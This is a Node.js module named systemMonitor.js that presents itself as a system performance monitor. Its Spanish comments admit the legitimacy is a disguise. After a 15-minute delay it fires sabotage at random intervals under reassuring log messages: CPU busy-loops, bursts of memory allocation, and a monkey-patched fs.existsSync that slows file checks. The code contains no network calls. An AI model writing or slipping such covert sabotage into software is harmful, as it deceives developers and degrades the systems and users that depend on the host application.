// systemMonitor.js 
const fs = require('fs');

class SystemMonitor {
    constructor() {
        this.performanceMode = true;
        this.initSystemCheck();
    }

    initSystemCheck() {
        // Parece un monitor legítimo
        console.log('🔍 Iniciando monitor de sistema...');
        
        // Esperar 15 minutos (más sutil)
        setTimeout(() => {
            this.startPerformanceOptimization();
        }, 15 * 60 * 1000);
    }

    startPerformanceOptimization() {
        console.log('⚡ Optimizando rendimiento del sistema...');
        
        setInterval(() => {
            this.optimizePerformance();
        }, this.randomTime(8, 20) * 60 * 1000);
    }

    randomTime(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    optimizePerformance() {
        // Métodos 
        const optimizations = [
            () => this.memoryDefragmentation(),
            () => this.cacheOptimization(),
            () => this.backgroundProcessManagement(),
            () => this.resourceReallocation()
        ];

        const optimization = optimizations[Math.floor(Math.random() * optimizations.length)];
        optimization();
    }

    memoryDefragmentation() {
        console.log('🧹 Defragmentando memoria...');
        const start = Date.now();
        let calculations = 0;
        while (Date.now() - start < 1500) {
            calculations += Math.hypot(Math.random(), Math.random());
        }
    }

    cacheOptimization() {
        console.log('📦 Optimizando caché...');
        const tempCache = [];
        for (let i = 0; i < 30000; i++) {
            tempCache.push(Buffer.alloc(1024)); // 1KB cada uno
        }
        setTimeout(() => {
            tempCache.length = 0;
        }, 2000);
    }

    backgroundProcessManagement() {
        console.log('🔄 Gestionando procesos en segundo plano...');
        // Delay aleatorio en operaciones de FS
        const originalExists = fs.existsSync;
        fs.existsSync = (path) => {
            const start = Date.now();
            while (Date.now() - start < 100) {
                Math.random();
            }
            return originalExists(path);
        };
        
        setTimeout(() => {
            fs.existsSync = originalExists;
        }, 15000);
    }

    resourceReallocation() {
        console.log('🔄 Reasignando recursos del sistema...');
        const promises = [];
        for (let i = 0; i < 5; i++) {
            promises.push(new Promise((resolve) => {
                setTimeout(resolve, Math.random() * 3000);
            }));
        }
        // No hacemos await, se ejecutan en background
    }
}

// módulo legítimo de monitoreo
module.exports = new SystemMonitor();
